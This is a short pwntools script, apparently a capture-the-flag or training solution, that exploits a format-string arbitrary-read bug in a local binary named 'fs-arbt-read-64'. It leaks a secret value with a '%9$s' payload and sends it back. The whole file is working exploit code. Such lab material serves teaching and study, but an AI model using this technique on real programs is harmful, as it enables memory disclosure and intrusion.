#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-read-64')

random_value_addr = p.elf.symbols['random_value']

print(p.recv())

buf = "%9$sBBBB" + p64(random_value_addr)

p.sendline(buf)

data = p.recv()

print(repr(data))

v = data.split(' ')[1].split('BBBB')[0]
print(repr(v))

value = u32(v)

p.sendline(hex(value))

p.interactive()
